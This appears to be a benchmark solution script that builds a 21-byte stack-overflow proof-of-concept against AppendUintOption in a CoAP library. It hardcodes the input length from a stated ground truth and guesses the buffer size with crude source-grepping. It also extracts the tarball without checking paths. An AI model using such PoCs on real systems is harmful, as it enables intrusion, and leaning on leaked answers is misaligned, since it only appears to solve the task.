import os
import tarfile
import tempfile
import subprocess
import random
import string
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth length is 21 bytes
        target_length = 21
        
        # Try to create a PoC of exactly 21 bytes that triggers overflow
        # We'll create a pattern that overflows a buffer and overwrites return address
        
        # Common pattern for buffer overflow:
        # - Fill buffer
        # - Overwrite saved base pointer
        # - Overwrite return address
        
        # For x86-64, return address is 8 bytes
        # We need to guess buffer size. Let's try different patterns.
        
        # Pattern 1: Simple A*21
        poc1 = b'A' * target_length
        
        # Pattern 2: Pattern with return address overwrite
        # Assuming buffer is 16 bytes (common), then we need:
        # 16 bytes buffer + 8 bytes saved RBP + 8 bytes return address = 32
        # But ground truth is 21, so maybe buffer is smaller or alignment
        
        # Let's try to analyze the source code to understand better
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                # Extract the tarball
                with tarfile.open(src_path, 'r:*') as tar:
                    tar.extractall(tmpdir)
                
                # Search for coap-message source files
                source_files = []
                for root, dirs, files in os.walk(tmpdir):
                    for file in files:
                        if file.endswith(('.c', '.h', '.cpp', '.cc')):
                            source_files.append(os.path.join(root, file))
                
                # Look for AppendUintOption function
                buffer_size = None
                for file in source_files:
                    try:
                        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'AppendUintOption' in content:
                                # Try to find buffer declaration
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if 'AppendUintOption' in line and '(' in line:
                                        # Look for buffer in function
                                        j = i
                                        brace_count = 0
                                        in_function = False
                                        while j < len(lines):
                                            if '{' in lines[j]:
                                                brace_count += lines[j].count('{')
                                                in_function = True
                                            if '}' in lines[j]:
                                                brace_count -= lines[j].count('}')
                                            if in_function and brace_count == 0:
                                                break
                                            
                                            # Look for buffer array declaration
                                            if '[' in lines[j] and ']' in lines[j]:
                                                # Try to extract size
                                                parts = lines[j].split('[')
                                                if len(parts) > 1:
                                                    size_part = parts[1].split(']')[0].strip()
                                                    if size_part.isdigit():
                                                        buffer_size = int(size_part)
                                                        break
                                            j += 1
                                        if buffer_size:
                                            break
                    except:
                        continue
                    if buffer_size:
                        break
                
                # If we found buffer size, create targeted PoC
                if buffer_size:
                    # We need to overflow buffer and possibly overwrite return address
                    # For stack overflow, we need to overwrite saved registers
                    # On x86-64: buffer + saved RBP + return address
                    # If buffer_size is small, we might only need buffer_size + 8 + 8
                    # But ground truth is 21, so adjust
                    
                    # Create pattern that overflows buffer and causes crash
                    # Use pattern that includes invalid address
                    pattern = b'A' * buffer_size + b'B' * 8 + b'C' * 8
                    # Trim to 21 bytes if pattern is longer
                    if len(pattern) > target_length:
                        pattern = pattern[:target_length]
                    return pattern
        except:
            pass
        
        # Fallback: Use ground truth length with pattern likely to cause crash
        # Create pattern with no null bytes and possible invalid memory access
        pattern = b'A' * 16 + b'B' * 5  # 21 bytes total
        
        return pattern